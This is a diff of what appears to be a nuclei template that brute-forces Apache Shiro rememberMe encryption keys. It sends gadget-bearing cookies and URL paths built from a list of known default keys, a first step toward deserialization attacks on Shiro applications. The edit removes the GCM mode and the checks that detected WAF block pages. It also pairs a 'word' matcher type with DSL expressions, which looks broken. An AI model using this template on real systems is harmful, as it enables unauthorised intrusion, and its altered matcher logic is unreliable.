@@ -1,4 +1,4 @@
-id: shiro-default-key
+id: shiro-brute-key
 opsec: true
 info:
   name: brute Shiro key
@@ -8,14 +8,13 @@ info:
 http:
   - raw:
       - |
-        GET / HTTP/1.1
+        GET /{{generate_shiro_gadget(key, "cbc")}} HTTP/1.1
         Host: {{Hostname}}
         Cookie: JSESSIONID={{to_upper(rand_text_alphanumeric(32,""))}};rememberMe=123;
-
       - |
-        GET / HTTP/1.1
+        GET /{{to_upper(rand_text_alphanumeric(32,""))}};rememberMe={{generate_shiro_gadget(key, "cbc")}} HTTP/1.1
         Host: {{Hostname}}
-        Cookie: JSESSIONID={{to_upper(rand_text_alphanumeric(32,""))}};rememberMe={{generate_shiro_gadget(key, mode)}};
+        Cookie: JSESSIONID={{to_upper(rand_text_alphanumeric(32,""))}};rememberMe={{generate_shiro_gadget(key, "cbc")}};
 
     attack: clusterbomb
     payloads:
@@ -40,16 +39,13 @@ http:
         - "L7RioUULEFhRyxM7a2R/Yg=="
         - "r0e3c16IdVkouZgk1TKVMg=="
         - "bWluZS1hc3NldC1rZXk6QQ=="
-      mode:
-        - "cbc"
-        - "gcm"
 
     stop-at-first-match: true
     matchers:
-      - type: dsl
+      - type: word
+        part: header
+        negative: true
         dsl:
           - 'contains(header_1, "Set-Cookie") && (contains(header_1, "rememberMe=") || contains(header_1, "=deleteMe"))'
           - '!contains(header_2, "rememberMe=") && !contains(header_2, "=deleteMe")'
-          - '!contains(body_2, "<p>当前访问疑似黑客攻击，已被网站管理员设置拦截并记录</p>")' # WAF Block Page
-          - '!contains(body_2, "很抱歉，由于您访问的URL有可能对网站造成安全威胁，您的访问被阻断")' # WAF Block Page
         condition: and
